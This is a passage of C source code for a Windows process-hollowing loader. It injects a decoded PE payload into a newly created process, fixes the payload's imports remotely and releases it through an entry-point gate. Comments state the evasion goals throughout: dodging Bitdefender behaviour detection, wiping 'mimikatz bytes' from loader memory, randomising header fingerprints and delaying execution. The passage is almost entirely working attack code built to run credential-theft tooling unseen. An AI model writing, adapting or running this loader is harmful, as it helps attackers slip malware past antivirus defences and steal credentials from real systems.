    PIMAGE_NT_HEADERS pImgNtHdrs, DWORD dwRva, SIZE_T cbRequired) {

    if (!pPeBuffer || !pImgNtHdrs) return NULL;

    if (dwRva < pImgNtHdrs->OptionalHeader.SizeOfHeaders) {
        if ((SIZE_T)dwRva + cbRequired > dwPeSize) return NULL;
        return pPeBuffer + dwRva;
    }

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(pImgNtHdrs);
    for (WORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        DWORD sectionSize = sections[i].Misc.VirtualSize;
        if (sectionSize < sections[i].SizeOfRawData)
            sectionSize = sections[i].SizeOfRawData;

        if (dwRva < sections[i].VirtualAddress ||
            dwRva - sections[i].VirtualAddress >= sectionSize)
            continue;

        DWORD offsetInSection = dwRva - sections[i].VirtualAddress;
        if (offsetInSection >= sections[i].SizeOfRawData) return NULL;

        SIZE_T rawOffset = (SIZE_T)sections[i].PointerToRawData + offsetInSection;
        if (rawOffset + cbRequired > dwPeSize) return NULL;
        return pPeBuffer + rawOffset;
    }
    return NULL;
}

/* ================================================================
 * IAT 해결 — Session-ASLR 활용 (CreateRemoteThread 축 완전 제거)
 * ------------------------------------------------------------------
 * Windows 10+ 세션 ASLR: system32 DLL (ntdll, kernel32, advapi32,
 * cryptsp, cryptbase, user32, msvcrt 등) 은 같은 세션 모든 프로세스에서
 * 동일 base 주소에 로드됨.
 * → 로더에서 LoadLibraryA + GetProcAddress 로 해결한 주소가
 *   자식 프로세스에서도 그대로 유효.
 * → CreateRemoteThread(LoadLibraryA, "DLL") injection 패턴 제거:
 *   Bitdefender ATC 가 가장 잘 잡는 축 중 하나.
 *
 * GetProcAddress 는 forwarded export 자동 추적 (예: ADVAPI32 →
 * CRYPTSP → CRYPTBASE). 로더가 forward 체인을 수동으로 걸어갈 필요 無.
 * ================================================================ */
static BOOL EnsureRemoteLibraryLoaded(HANDLE hProcess, LPCSTR libraryName) {
    (void)hProcess;
    HMODULE h = GetModuleHandleA(libraryName);
    if (!h) h = g_api.LoadLibraryA(libraryName);
    return h != NULL;
}

static BOOL TranslateProcedureAddressToRemote(HANDLE hProcess,
    FARPROC localProcedure, ULONG_PTR* pRemoteProcedure) {
    (void)hProcess;
    if (!localProcedure || !pRemoteProcedure) return FALSE;
    *pRemoteProcedure = (ULONG_PTR)localProcedure;
    return TRUE;
}

/* ================================================================
 * Remote IAT repair
 * ================================================================ */
static BOOL RepairRemoteIAT(HANDLE hProcess, PBYTE pPeBuffer,
    DWORD dwPeSize, PIMAGE_NT_HEADERS pImgNtHdrs, ULONG_PTR uRemoteBase) {

    IMAGE_DATA_DIRECTORY importDirectory =
        pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (!importDirectory.VirtualAddress || !importDirectory.Size) {
        printf("[*] No import directory\n");
        return TRUE;
    }

    DWORD descriptorCount = importDirectory.Size / sizeof(IMAGE_IMPORT_DESCRIPTOR);
    if (!descriptorCount || descriptorCount > 1024) return FALSE;

    for (DWORD descriptorIndex = 0; descriptorIndex < descriptorCount; descriptorIndex++) {
        DWORD descriptorRva = importDirectory.VirtualAddress +
            descriptorIndex * sizeof(IMAGE_IMPORT_DESCRIPTOR);
        PIMAGE_IMPORT_DESCRIPTOR descriptor = (PIMAGE_IMPORT_DESCRIPTOR)RawPointerFromRva(
            pPeBuffer, dwPeSize, pImgNtHdrs, descriptorRva, sizeof(IMAGE_IMPORT_DESCRIPTOR));
        if (!descriptor) {
            fprintf(stderr, "[-] Import descriptor outside file\n");
            return FALSE;
        }
        if (!descriptor->Name && !descriptor->FirstThunk) break;
        if (!descriptor->Name || !descriptor->FirstThunk) return FALSE;

        PBYTE libraryNameBytes = RawPointerFromRva(pPeBuffer, dwPeSize, pImgNtHdrs,
            descriptor->Name, 1);
        if (!libraryNameBytes) return FALSE;
        SIZE_T libraryNameLimit = dwPeSize - (SIZE_T)(libraryNameBytes - pPeBuffer);
        if (!memchr(libraryNameBytes, '\0', libraryNameLimit)) return FALSE;

        LPCSTR libraryName = (LPCSTR)libraryNameBytes;
        HMODULE localModule = g_api.LoadLibraryA(libraryName);
        if (!localModule) {
            fprintf(stderr, "[-] LoadLibraryA failed for import: %s\n", libraryName);
            return FALSE;
        }
        if (!EnsureRemoteLibraryLoaded(hProcess, libraryName)) {
            fprintf(stderr, "[-] Unable to load import DLL in target: %s\n", libraryName);
            return FALSE;
        }

        DWORD sourceThunkRva = descriptor->OriginalFirstThunk
            ? descriptor->OriginalFirstThunk
            : descriptor->FirstThunk;
        DWORD resolvedCount = 0;

        for (DWORD thunkIndex = 0; thunkIndex < 65536; thunkIndex++) {
            ULONGLONG thunkRva64 = (ULONGLONG)sourceThunkRva +
                (ULONGLONG)thunkIndex * sizeof(IMAGE_THUNK_DATA);
            ULONGLONG targetRva64 = (ULONGLONG)descriptor->FirstThunk +
                (ULONGLONG)thunkIndex * sizeof(IMAGE_THUNK_DATA);
            if (thunkRva64 > MAXDWORD ||
                targetRva64 + sizeof(ULONG_PTR) > pImgNtHdrs->OptionalHeader.SizeOfImage) {
                fprintf(stderr, "[-] Import thunk range invalid\n");
                return FALSE;
            }

            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)RawPointerFromRva(
                pPeBuffer, dwPeSize, pImgNtHdrs, (DWORD)thunkRva64, sizeof(IMAGE_THUNK_DATA));
            if (!thunk) {
                fprintf(stderr, "[-] Import thunk outside file\n");
                return FALSE;
            }
            if (!thunk->u1.AddressOfData) break;

            FARPROC functionAddress = NULL;
            if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                functionAddress = g_api.GetProcAddress(localModule,
                    MAKEINTRESOURCEA(IMAGE_ORDINAL(thunk->u1.Ordinal)));
            } else {
                if (thunk->u1.AddressOfData > MAXDWORD) return FALSE;
                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)RawPointerFromRva(
                    pPeBuffer, dwPeSize, pImgNtHdrs,
                    (DWORD)thunk->u1.AddressOfData, sizeof(WORD) + 1);
                if (!importByName) return FALSE;

                PBYTE functionName = (PBYTE)importByName->Name;
                SIZE_T functionNameLimit = dwPeSize - (SIZE_T)(functionName - pPeBuffer);
                if (!memchr(functionName, '\0', functionNameLimit)) return FALSE;
                functionAddress = g_api.GetProcAddress(localModule, (LPCSTR)functionName);
            }

            if (!functionAddress) {
                fprintf(stderr, "[-] GetProcAddress failed in %s\n", libraryName);
                return FALSE;
            }

            ULONG_PTR remoteFunction = 0;
            if (!TranslateProcedureAddressToRemote(hProcess, functionAddress, &remoteFunction)) {
                fprintf(stderr, "[-] Import address translation failed: %p from %s\n",
                        functionAddress, libraryName);
                return FALSE;
            }

            SIZE_T written = 0;
            PVOID remoteThunk = (PVOID)(uRemoteBase + (ULONG_PTR)targetRva64);
            if (!RemoteWrite(hProcess, remoteThunk,
                                          &remoteFunction, sizeof(remoteFunction), &written) ||
                written != sizeof(remoteFunction)) {
                PRINT_WINAPI_ERR("WriteProcessMemory[IAT]");
                return FALSE;
            }
            resolvedCount++;
        }

        printf("[*] IAT %-20s : %lu imports resolved\n", libraryName, resolvedCount);
    }

    printf("[*] Remote IAT repair complete\n");
    return TRUE;
}

/* ================================================================
 * Entry gate wait/release
 * ================================================================ */
static BOOL WaitForRemoteEntryGate(HANDLE hProcess,
    PBYTE pRemoteGateState, DWORD dwGateTimeoutMs) {

    ULONGLONG started = GetTickCount64();

    for (;;) {
        BYTE reached = 0;
        SIZE_T read = 0;
        if (!g_api.ReadProcessMemory(hProcess, pRemoteGateState,
                                     &reached, sizeof(reached), &read) ||
            read != sizeof(reached)) {
            PRINT_WINAPI_ERR("ReadProcessMemory[entry-gate]");
            return FALSE;
        }
        if (reached == 1) {
            printf("[*] Windows loader initialization complete\n");
            return TRUE;
        }

        DWORD wait = WaitForSingleObject(hProcess, 0);
        if (wait == WAIT_OBJECT_0) {
            DWORD exitCode = 0;
            GetExitCodeProcess(hProcess, &exitCode);
            fprintf(stderr, "[-] Target exited before entry gate: 0x%08lX\n", exitCode);
            return FALSE;
        }
        if (wait == WAIT_FAILED) {
            PRINT_WINAPI_ERR("WaitForSingleObject[entry-gate]");
            return FALSE;
        }

        if (GetTickCount64() - started >= dwGateTimeoutMs) {
            fprintf(stderr, "[-] Timed out waiting for Windows loader initialization\n");
            SetLastError(ERROR_TIMEOUT);
            return FALSE;
        }
        Sleep(10);
    }
}

static BOOL ReleaseRemoteEntryGate(HANDLE hProcess, PBYTE pRemoteGateState) {
    BYTE release = 1;
    SIZE_T written = 0;
    if (!RemoteWrite(hProcess, pRemoteGateState + 1,
                                  &release, sizeof(release), &written) ||
        written != sizeof(release)) {
        PRINT_WINAPI_ERR("WriteProcessMemory[release-entry-gate]");
        return FALSE;
    }
    printf("[*] Payload entry gate released\n");
    return TRUE;
}

/* ================================================================
 * Section characteristics → remote memory protection
 * ================================================================ */
static BOOL FixMemPermissionsEx(HANDLE hProcess, ULONG_PTR pPeBaseAddress,
    PIMAGE_NT_HEADERS pImgNtHdrs, PIMAGE_SECTION_HEADER pImgSecHdr) {

    for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        DWORD dwProtection    = PAGE_NOACCESS;
        DWORD dwOldProtection = 0;
        DWORD characteristics = pImgSecHdr[i].Characteristics;

        if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress) continue;

        if      ((characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                 (characteristics & IMAGE_SCN_MEM_READ)    &&
                 (characteristics & IMAGE_SCN_MEM_WRITE))    dwProtection = PAGE_EXECUTE_READWRITE;
        else if ((characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                 (characteristics & IMAGE_SCN_MEM_READ))     dwProtection = PAGE_EXECUTE_READ;
        else if ((characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                 (characteristics & IMAGE_SCN_MEM_WRITE))    dwProtection = PAGE_EXECUTE_WRITECOPY;
        else if  (characteristics & IMAGE_SCN_MEM_EXECUTE)   dwProtection = PAGE_EXECUTE;
        else if ((characteristics & IMAGE_SCN_MEM_READ)    &&
                 (characteristics & IMAGE_SCN_MEM_WRITE))    dwProtection = PAGE_READWRITE;
        else if  (characteristics & IMAGE_SCN_MEM_READ)      dwProtection = PAGE_READONLY;
        else if  (characteristics & IMAGE_SCN_MEM_WRITE)     dwProtection = PAGE_WRITECOPY;

        if (!g_api.VirtualProtectEx(hProcess,
                                    (PVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress),
                                    pImgSecHdr[i].SizeOfRawData,
                                    dwProtection, &dwOldProtection)) {
            PRINT_WINAPI_ERR("VirtualProtectEx");
            return FALSE;
        }
    }
    printf("[*] Section permissions applied\n");
    return TRUE;
}

/* ================================================================
 * Full process hollowing flow
 * ================================================================ */
static BOOL RemotePeExec(PBYTE pPeBuffer, LPCSTR cRemoteProcessImage,
    DWORD dwPeSize, LPCSTR cProcessParms, DWORD dwTimeoutMs) {

    PROCESS_INFORMATION   ProcessInfo          = { 0 };
    CONTEXT               Context              = { 0 };
    PBYTE                 pRemoteAddress       = NULL;
    PBYTE                 pRemoteGateState     = NULL;
    ULONG_PTR             uOriginalEntryPoint  = 0;
    ULONG_PTR             uPebImageBaseField   = 0;
    ULONG_PTR             uPayloadEntryPoint   = 0;
    PIMAGE_NT_HEADERS     pImgNtHdrs           = NULL;
    PIMAGE_SECTION_HEADER pImgSecHdr           = NULL;
    SIZE_T                NumberOfBytesWritten = 0;
    BOOL                  bThreadResumed       = FALSE;
    BOOL                  bSTATE               = FALSE;
    HANDLE                hSection             = NULL;  /* section-backed hollowing */

    if (!pPeBuffer || !cRemoteProcessImage || dwPeSize < sizeof(IMAGE_DOS_HEADER))
        return FALSE;

    printf("[*] Entering RemotePeExec\n");

    Context.ContextFlags = CONTEXT_ALL;

    if (!CreateTheHollowedProcess(cRemoteProcessImage, cProcessParms, &ProcessInfo))
        goto _CLEANUP;

    printf("[*] Hollow process created\n");

    {
        LONG ntOffset = ((PIMAGE_DOS_HEADER)pPeBuffer)->e_lfanew;
        if (ntOffset <= 0 || (SIZE_T)ntOffset + sizeof(IMAGE_NT_HEADERS) > dwPeSize) {
            fprintf(stderr, "[!] Invalid NT header offset\n");
            goto _CLEANUP;
        }
        pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)pPeBuffer + (SIZE_T)ntOffset);
    }

    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "[!] Invalid NT Image Headers\n");
        goto _CLEANUP;
    }
    if (pImgNtHdrs->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
        pImgNtHdrs->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ||
        pImgNtHdrs->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER64)) {
        fprintf(stderr, "[-] Hollowing path requires an x64 PE\n");
        goto _CLEANUP;
    }
    if (!pImgNtHdrs->FileHeader.NumberOfSections ||
        pImgNtHdrs->FileHeader.NumberOfSections > 96) {
        fprintf(stderr, "[-] Invalid section count\n");
        goto _CLEANUP;
    }
    {
        SIZE_T sectionTableOffset = (SIZE_T)((PBYTE)IMAGE_FIRST_SECTION(pImgNtHdrs) - pPeBuffer);
        SIZE_T sectionTableSize = (SIZE_T)pImgNtHdrs->FileHeader.NumberOfSections *
            sizeof(IMAGE_SECTION_HEADER);
        if (sectionTableOffset > dwPeSize ||
            sectionTableSize > dwPeSize - sectionTableOffset ||
            !pImgNtHdrs->OptionalHeader.SizeOfHeaders ||
            pImgNtHdrs->OptionalHeader.SizeOfHeaders > dwPeSize ||
            pImgNtHdrs->OptionalHeader.SizeOfHeaders > pImgNtHdrs->OptionalHeader.SizeOfImage) {
            fprintf(stderr, "[-] Invalid PE header/section bounds\n");
            goto _CLEANUP;
        }
    }

    printf("[*] ImageBase: 0x%p  SizeOfImage: 0x%lX\n",
           (PVOID)(ULONG_PTR)pImgNtHdrs->OptionalHeader.ImageBase,
           pImgNtHdrs->OptionalHeader.SizeOfImage);

    /* MEM_PRIVATE 할당 (section-backed 는 이 환경에서 0xC000000D) — WPM 경로로 fallback. */
    pRemoteAddress = (PBYTE)g_api.VirtualAllocEx(ProcessInfo.hProcess,
        (LPVOID)(ULONG_PTR)pImgNtHdrs->OptionalHeader.ImageBase,
        (SIZE_T)pImgNtHdrs->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteAddress) {
        PRINT_WINAPI_ERR("VirtualAllocEx");
        goto _CLEANUP;
    }
    printf("[*] Remote alloc at: 0x%p\n", pRemoteAddress);

    if ((ULONG_PTR)pRemoteAddress != (ULONG_PTR)pImgNtHdrs->OptionalHeader.ImageBase) {
        fprintf(stderr, "[!] PE Payload requires relocation - [NOT SUPPORTED]\n");
        fprintf(stderr, "[!] Wanted: 0x%p  Got: 0x%p\n",
                (PVOID)(ULONG_PTR)pImgNtHdrs->OptionalHeader.ImageBase, pRemoteAddress);
        goto _CLEANUP;
    }

    if (!RemoteWrite(ProcessInfo.hProcess, pRemoteAddress, pPeBuffer,
                                  pImgNtHdrs->OptionalHeader.SizeOfHeaders,
                                  &NumberOfBytesWritten) ||
        NumberOfBytesWritten != pImgNtHdrs->OptionalHeader.SizeOfHeaders) {
        PRINT_WINAPI_ERR("WriteProcessMemory[headers]");
        goto _CLEANUP;
    }
    printf("[*] PE headers written\n");

    pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);

    /* Progressive zero: import directory 가 있는 섹션은 IAT 복구 때까지 보존, 나머지는 WPM 직후 영구 삭제 */
    int preservedSectionIdx = -1;
    {
        DWORD importRva =
            pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        if (importRva) {
            for (WORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
                DWORD vSize = pImgSecHdr[i].Misc.VirtualSize;
                if (vSize < pImgSecHdr[i].SizeOfRawData) vSize = pImgSecHdr[i].SizeOfRawData;
                if (importRva >= pImgSecHdr[i].VirtualAddress &&
                    importRva <  pImgSecHdr[i].VirtualAddress + vSize) {
                    preservedSectionIdx = (int)i;
                    break;
                }
            }
        }
    }
    printf("[*] Progressive zero: preserving section %d for IAT repair\n", preservedSectionIdx);

    for (WORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        if (pImgSecHdr[i].SizeOfRawData == 0) continue;

        if ((ULONGLONG)pImgSecHdr[i].PointerToRawData + pImgSecHdr[i].SizeOfRawData > dwPeSize ||
            (ULONGLONG)pImgSecHdr[i].VirtualAddress + pImgSecHdr[i].SizeOfRawData >
                pImgNtHdrs->OptionalHeader.SizeOfImage) {
            fprintf(stderr, "[-] Section %u outside PE bounds\n", i);
            goto _CLEANUP;
        }

        NumberOfBytesWritten = 0;
        if (!RemoteWrite(ProcessInfo.hProcess,
                                      pRemoteAddress + pImgSecHdr[i].VirtualAddress,
                                      pPeBuffer      + pImgSecHdr[i].PointerToRawData,
                                      pImgSecHdr[i].SizeOfRawData,
                                      &NumberOfBytesWritten) ||
            NumberOfBytesWritten != pImgSecHdr[i].SizeOfRawData) {
            PRINT_WINAPI_ERR("WriteProcessMemory[section]");
            goto _CLEANUP;
        }
        printf("[*] Section [%d] written: VA=0x%08lX  size=0x%lX\n",
               i, pImgSecHdr[i].VirtualAddress, pImgSecHdr[i].SizeOfRawData);

        /* 쓴 섹션 로더 heap 에서 즉시 삭제 (import section 제외) */
        if ((int)i != preservedSectionIdx) {
            SecureZeroMemory(pPeBuffer + pImgSecHdr[i].PointerToRawData,
                             pImgSecHdr[i].SizeOfRawData);
            printf("[*] Section [%d] source zeroed in loader heap\n", i);
        }
    }

    if (!g_api.GetThreadContext(ProcessInfo.hThread, &Context)) {
        PRINT_WINAPI_ERR("GetThreadContext");
        goto _CLEANUP;
    }
    printf("[*] Thread context: RIP=0x%llX  RCX=0x%llX  RDX=0x%llX\n",
           Context.Rip, Context.Rcx, Context.Rdx);

    uOriginalEntryPoint = (ULONG_PTR)Context.Rcx;
    uPebImageBaseField = (ULONG_PTR)Context.Rdx + offsetof(PEB, Reserved3[1]);
    uPayloadEntryPoint = (ULONG_PTR)pRemoteAddress +
        pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;

    if (!InstallEntryPointTrampoline(ProcessInfo.hProcess,
                                     uOriginalEntryPoint, uPebImageBaseField,
                                     (ULONG_PTR)pRemoteAddress, uPayloadEntryPoint,
                                     &pRemoteGateState))
        goto _CLEANUP;

    printf("[*] Resuming thread...\n");

    if (g_api.ResumeThread(ProcessInfo.hThread) == (DWORD)-1) {
        PRINT_WINAPI_ERR("ResumeThread");
        goto _CLEANUP;
    }
    bThreadResumed = TRUE;

    if (!WaitForRemoteEntryGate(ProcessInfo.hProcess, pRemoteGateState, 10000))
        goto _CLEANUP;

    if (!RepairRemoteIAT(ProcessInfo.hProcess, pPeBuffer, dwPeSize,
                         pImgNtHdrs, (ULONG_PTR)pRemoteAddress))
        goto _CLEANUP;

    if (!FixMemPermissionsEx(ProcessInfo.hProcess,
                             (ULONG_PTR)pRemoteAddress, pImgNtHdrs, pImgSecHdr))
        goto _CLEANUP;

    /* 로더 heap 에서 payload 완전 삭제 (preserved section + 헤더) */
    if (preservedSectionIdx >= 0 && pImgSecHdr[preservedSectionIdx].SizeOfRawData) {
        SecureZeroMemory(pPeBuffer + pImgSecHdr[preservedSectionIdx].PointerToRawData,
                         pImgSecHdr[preservedSectionIdx].SizeOfRawData);
    }
    SecureZeroMemory(pPeBuffer, pImgNtHdrs->OptionalHeader.SizeOfHeaders);
    pImgNtHdrs = NULL;  /* 헤더 zero 됨 — 더 쓰면 안됨 */
    pImgSecHdr = NULL;
    printf("[*] Loader heap payload fully erased\n");

    /* 로컬 뷰 unmap: 로더 주소공간에서 mimikatz 바이트 제거 (section 은 shared 이므로
     * zero 하면 원격까지 날아감 → unmap 이 정답). 원격 뷰는 자식이 계속 소유. */
    if (g_pLocalView) {
        g_api.NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, g_pLocalView);
        g_pLocalView  = NULL;
        g_pRemoteBase = NULL;
        g_viewSize    = 0;
        printf("[*] Local section view unmapped\n");
    }
    if (hSection) {
        g_api.NtClose(hSection);
        hSection = NULL;
    }

    printf("[*] Pre-release sleep %u ms (heap clean, delaying payload exec trigger)\n",
           (unsigned)PRE_RELEASE_SLEEP_MS);
    Sleep(PRE_RELEASE_SLEEP_MS);

    if (!ReleaseRemoteEntryGate(ProcessInfo.hProcess, pRemoteGateState))
        goto _CLEANUP;

    printf("[*] Waiting for process exit");
    if (dwTimeoutMs == INFINITE) printf(" (no timeout)...\n");
    else                         printf(" (timeout: %lu ms)...\n", dwTimeoutMs);

    {
        ULONGLONG ullStarted = GetTickCount64();
        DWORD dwWait = WAIT_TIMEOUT;
        DWORD dwExitCode = STILL_ACTIVE;

        for (;;) {
            dwWait = WaitForSingleObject(ProcessInfo.hProcess, 100);
            if (dwWait == WAIT_OBJECT_0) break;
            if (dwWait == WAIT_FAILED) {
                PRINT_WINAPI_ERR("WaitForSingleObject");
                goto _CLEANUP;
            }
            if (dwTimeoutMs != INFINITE &&
                GetTickCount64() - ullStarted >= dwTimeoutMs) {
                fprintf(stderr, "[!] Timeout after %lu ms - PID %lu still running\n",
                        dwTimeoutMs, ProcessInfo.dwProcessId);
                SetLastError(ERROR_TIMEOUT);
                goto _CLEANUP;
            }
        }

        if (!GetExitCodeProcess(ProcessInfo.hProcess, &dwExitCode)) {
            PRINT_WINAPI_ERR("GetExitCodeProcess");
            goto _CLEANUP;
        }
        printf("[*] Hollowed process exited with code: 0x%08lX (%lu)\n",
               dwExitCode, dwExitCode);

        if ((dwExitCode & 0xF0000000UL) == 0xC0000000UL) {
            fprintf(stderr, "[-] Hollowed process terminated by exception: 0x%08lX\n",
                    dwExitCode);
            goto _CLEANUP;
        }
    }

    bSTATE = TRUE;

_CLEANUP:
    if (g_pLocalView) {
        g_api.NtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, g_pLocalView);
        g_pLocalView  = NULL;
        g_pRemoteBase = NULL;
        g_viewSize    = 0;
    }
    if (hSection) {
        g_api.NtClose(hSection);
        hSection = NULL;
    }
    if (!bSTATE && bThreadResumed && ProcessInfo.hProcess) {
        DWORD exitCode = 0;
        if (GetExitCodeProcess(ProcessInfo.hProcess, &exitCode) &&
            exitCode == STILL_ACTIVE) {
            g_api.TerminateProcess(ProcessInfo.hProcess, ERROR_PROCESS_ABORTED);
            WaitForSingleObject(ProcessInfo.hProcess, 1000);
            printf("[*] Failed child process terminated\n");
        }
    }
    DELETE_HANDLE(ProcessInfo.hThread);
    DELETE_HANDLE(ProcessInfo.hProcess);
    return bSTATE;
}

/* ================================================================
 * main
 * ================================================================ */
int main(int argc, char* argv[]) {
    DATA   payload       = { NULL, 0 };
    BOOL   bResult       = FALSE;
    DWORD  dwTimeoutMs   = INFINITE;
    LPCSTR pPayloadPath  = NULL;
    LPCSTR pTargetProcess= NULL;

    setvbuf(stdout, NULL, _IONBF, 0);
    srand((unsigned)GetTickCount());

    if (!InitApiTable()) {
        fprintf(stderr, "[!] API table init failed\n");
        return -1;
    }

    if (argc < 3) {
        fprintf(stderr, "Usage: %s <hsf_payload> <target_process> [timeout_ms]\n", argv[0]);
        return -1;
    }

    pPayloadPath   = argv[1];
    pTargetProcess = argv[2];

    if (argc >= 4) {
        CHAR* end = NULL;
        unsigned long parsed = strtoul(argv[3], &end, 10);
        if (!end || *end != '\0') {
            fprintf(stderr, "[-] Invalid timeout_ms: %s\n", argv[3]);
            return -1;
        }
        dwTimeoutMs = parsed == 0 ? INFINITE : (DWORD)parsed;
    }

    printf("[*] Payload : %s\n", pPayloadPath);
    printf("[*] Target  : %s\n", pTargetProcess);

    payload = LoadHSF(pPayloadPath);
    if (!payload.data || !payload.len) {
        fprintf(stderr, "[!] Failed to decode HSF: %s\n", pPayloadPath);
        return -1;
    }

    if (payload.len < 2 ||
        ((BYTE*)payload.data)[0] != 'M' || ((BYTE*)payload.data)[1] != 'Z') {
        fprintf(stderr, "[!] Decoded buffer is not a valid PE (bad MZ)\n");
        free(payload.data);
        return -1;
    }
    printf("[*] MZ header verified\n");

#if ENABLE_STOMP_FULL
    /* Payload PE 지문 변형: TimeDateStamp/CheckSum/Rich/Debug/section/Linker/OS random */
    StompPeHeaderFull((BYTE*)payload.data, (DWORD)payload.len);
#endif

    if (!EnableDebugPrivilege()) {
        fprintf(stderr, "[!] SeDebugPrivilege unavailable; using CreateProcess handle\n");
    }

    printf("[*] Native PE - starting process hollowing\n");
    bResult = RemotePeExec((PBYTE)payload.data, pTargetProcess,
                           (DWORD)payload.len, PARMS, dwTimeoutMs);

    free(payload.data);
    printf(bResult ? "[+] Done\n" : "[-] Failed\n");
    return bResult ? 0 : -1;
}
